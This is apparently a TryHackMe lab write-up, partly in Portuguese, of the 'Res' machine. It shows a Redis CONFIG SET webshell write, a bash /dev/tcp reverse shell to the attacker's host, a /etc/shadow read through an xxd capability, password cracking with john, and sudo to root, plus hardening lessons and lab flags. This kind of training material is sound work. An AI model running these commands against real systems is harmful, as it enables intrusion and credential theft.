# Res — TryHackMe Write-up

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-blue)
![OS](https://img.shields.io/badge/OS-Linux-lightgrey)
![Status](https://img.shields.io/badge/Status-Completed-success)

---

## Machine Information

| Attribute          | Details       |
|--------------------|---------------|
| **Name**           | Res           |
| **Platform**       | TryHackMe     |
| **Difficulty**     | Easy          |
| **OS**             | Linux (Ubuntu 20.04) |
| **Date Completed** | April 2026    |

---

## Attack Chain

```
RECON        →  nmap -sC -sV         →  HTTP(80), SSH(22), Redis(6379)
REDIS RCE    →  CONFIG SET + SAVE    →  webshell PHP escrita no webroot
SHELL        →  curl webshell        →  reverse shell como www-data
POST-EXP     →  /home/vianka/        →  user.txt capturada
PRIVESC 1    →  xxd /etc/shadow      →  hash de vianka extraído
CRED CRACK   →  john + rockyou       →  beautiful1
LATERAL      →  su vianka            →  shell como vianka
PRIVESC 2    →  sudo su              →  root shell
ROOT         →  /root/root.txt       →  thm{xxd_pr1v_escalat1on}
```

---

## Enumeration

### Nmap

```bash
nmap -sC -sV -T4 <IP> -oN nmap.txt
```

| Port     | Service | Version       | Note                              |
|----------|---------|---------------|-----------------------------------|
| 22/tcp   | SSH     | OpenSSH 7.6p1 | —                                 |
| 80/tcp   | HTTP    | Apache 2.4.29 | Página padrão do Apache           |
| 6379/tcp | Redis   | Redis 6.0.7   | Sem autenticação — acesso aberto  |

Três serviços expostos. O Redis sem senha é o vetor imediato — qualquer client pode conectar e executar comandos administrativos, incluindo `CONFIG SET` para alterar o diretório e nome do arquivo de dump, efetivamente escrevendo arquivos arbitrários no sistema como o usuário que roda o serviço (vianka).

### Redis — Reconhecimento

```bash
redis-cli -h <IP> ping
# PONG — sem autenticação

redis-cli -h <IP> INFO server | grep redis_version
# redis_version:6.0.7

redis-cli -h <IP> CONFIG GET dir
# /home/vianka/redis-stable
```

---

## Initial Access

O Redis 6.0.7 rodando sem `requirepass` permite que qualquer client execute `CONFIG SET` e redirecione o dump para um diretório acessível pelo servidor web. A combinação Redis aberto + Apache servindo `/var/www/html` cria o vetor direto para RCE.

```bash
# Configurar Redis para salvar no webroot
redis-cli -h <IP> CONFIG SET dir /var/www/html
redis-cli -h <IP> CONFIG SET dbfilename shell.php

# Injetar webshell como valor de uma chave
redis-cli -h <IP> SET pwn "<?php system(\$_GET['cmd']); ?>"

# Salvar — o dump agora contém a webshell no webroot
redis-cli -h <IP> SAVE
```

O arquivo gerado contém cabeçalho binário do Redis seguido do payload PHP. O Apache interpreta apenas o bloco `<?php ?>`, ignorando os bytes anteriores.

```bash
# Confirmar RCE
curl "http://<IP>/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data)

# Reverse shell
nc -lvnp 4444
curl "http://<IP>/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<KALI>/4444+0>%261'"
```

> **Note:** O Redis salva o dump em modo binário com cabeçalho proprietário antes do conteúdo das chaves. Esse cabeçalho não impede a execução PHP porque o interpretador procura o delimitador `<?php` em qualquer posição do arquivo. A mesma técnica funciona para injetar código em qualquer arquivo que seja interpretado, não apenas executado diretamente.

---

## Post-Exploitation

Com shell como `www-data`, a enumeração do sistema revelou dois usuários com diretório home: `ubuntu` e `vianka`. O home de vianka estava acessível e continha a user flag diretamente.

```bash
ls /home/vianka/
cat /home/vianka/user.txt
# thm{red1s_rce_w1thout_credent1als}
```

O arquivo `/var/backups/shadow.bak` existia no sistema mas estava protegido contra leitura por www-data. O binário `xxd` foi identificado como vetor de escalada.

---

## Privilege Escalation

### Leitura do /etc/shadow via xxd

O binário `xxd` possuía a capability `cap_dac_read_search+ep`, permitindo leitura de arquivos protegidos independente das permissões do sistema de arquivos. Essa capability bypassa a verificação de permissão do kernel para operações de leitura.

```bash
# Verificar capability
getcap /usr/bin/xxd
# /usr/bin/xxd = cap_dac_read_search+ep

# Ler o shadow
LFILE=/etc/shadow
xxd "$LFILE" | xxd -r
```

O hash de vianka foi extraído do output e quebrado no Kali:

```bash
# No Kali — salvar o hash e quebrar
echo 'vianka:$6$...:...' > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# beautiful1
```

### Lateral Movement e Root

```bash
su vianka
# Password: beautiful1

sudo su
# Password: beautiful1
# root@machine:~#

cat /root/root.txt
# thm{xxd_pr1v_escalat1on}
```

---

## Flags

| File       | Path            | Flag                              |
|------------|-----------------|-----------------------------------|
| `user.txt` | `/home/vianka/` | `thm{red1s_rce_w1thout_credent1als}` |
| `root.txt` | `/root/`        | `thm{xxd_pr1v_escalat1on}`        |

---

## Lições Aprendidas

**Redis sem autenticação é RCE imediato quando há servidor web no mesmo host.** A combinação `CONFIG SET dir` + `CONFIG SET dbfilename` + `SAVE` permite escrever conteúdo arbitrário em qualquer caminho onde o processo Redis tenha permissão de escrita. Em ambientes reais, Redis deve escutar apenas em `127.0.0.1` e obrigatoriamente ter `requirepass` configurado.

**Capabilities Linux são tão perigosas quanto bits SUID.** A capability `cap_dac_read_search` em um binário como `xxd` permite ler `/etc/shadow`, `/etc/ssl/private` ou qualquer arquivo protegido do sistema. Diferente do SUID, capabilities não aparecem em buscas por `find / -perm -4000` — exigem `getcap -r /` como etapa separada de enumeração.

**Senhas fracas em usuários com sudo completo são o risco mais crítico.** Depois de obter o hash via xxd, a senha `beautiful1` estava no rockyou. Vianka tinha `sudo` irrestrito — uma senha fraca aqui equivale a root exposto diretamente.

```bash
# Comandos de referência — enumeração de capabilities
getcap -r / 2>/dev/null

# Redis write-to-file via CONFIG SET
redis-cli -h <IP> CONFIG SET dir <PATH>
redis-cli -h <IP> CONFIG SET dbfilename <FILENAME>
redis-cli -h <IP> SET key "<PAYLOAD>"
redis-cli -h <IP> SAVE
```

---

## Tools Used

| Tool         | Purpose                                     |
|--------------|---------------------------------------------|
| `nmap`       | Port scanning e detecção de serviços        |
| `redis-cli`  | Interação com Redis e escrita de arquivos   |
| `netcat`     | Listener para reverse shell                 |
| `xxd`        | Leitura de arquivos protegidos via capability |
| `john`       | Quebra do hash de senha extraído do shadow  |

---

## References

- [Redis Security — Documentação oficial](https://redis.io/docs/manual/security/) — configuração de autenticação e binding
- [GTFOBins — xxd](https://gtfobins.github.io/gtfobins/xxd/) — leitura de arquivos via capability
- [Linux Capabilities — man7.org](https://man7.org/linux/man-pages/man7/capabilities.7.html) — referência completa de capabilities

---

*UmbraNull · [github.com/igorleite97](https://github.com/igorleite97) · offensive-writeups*